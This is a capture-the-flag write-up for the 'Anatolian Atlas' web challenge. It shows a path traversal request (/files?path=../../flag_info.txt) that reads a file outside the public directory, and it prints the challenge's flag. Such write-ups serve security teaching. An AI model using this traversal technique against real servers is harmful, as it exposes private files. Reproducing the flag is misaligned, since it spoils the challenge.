# HASBL CTF Writeup — Anatolian Atlas

| Field | Details |
|-------|---------|
| **Challenge** | Anatolian Atlas |
| **Difficulty** | Easy |
| **Author** | interr (Muhammed Efe Erdoğan) |
| **Hint** | None |
| **Flag** | `HASBL{7urkish_F00ds_4r3_D3lici0us}` |

---

## Solution

When we first visit the site, we see a map with red pins on it. Clicking a pin opens a sidebar for that restaurant. To submit a rating, we need to be logged in — so we create an account and sign in.

At first glance, the site doesn't reveal much, so we move on to inspecting the page source. Inside the source code, we spot a comment:

```
<!-- Hint: flag_info.txt exists somewhere outside the public docs. -->
```

We also notice something interesting about how the map image is loaded:

```html
<img class="turkiye-map" src="/files?path=turkiye.png" alt="Map of Turkiye" />
```

Navigating to that URL directly confirms it works — we can access the map image through the `/files?path=` endpoint.

---

## Path Traversal

The way the `/files` endpoint accepts a `path` parameter is suspicious. Combined with the hint about `flag_info.txt` being outside the public directory, this strongly suggests a **path traversal** vulnerability.

We try the following URL:

```
http://siteurl:port/files?path=../../flag_info.txt
```

Navigating to that URL, we're greeted with:

```
If you can read this file, you are close.

To reveal the flag:
- Go to the Kayseri restaurant.
- Set service to 3, food to 5, and hygiene to 4.
- Write the comment exactly as: "Give me the flag!"
- Submit the review to reveal the flag.
```

---

## Getting the Flag

Following the instructions from the file, we navigate to the **Kayseri** restaurant on the map and submit a review with:

- **Service:** 3 stars
- **Food:** 5 stars
- **Hygiene:** 4 stars
- **Comment:** `Give me the flag!`

The flag is revealed immediately after submission.

---

## Flag

```
HASBL{7urkish_F00ds_4r3_D3lici0us}
```
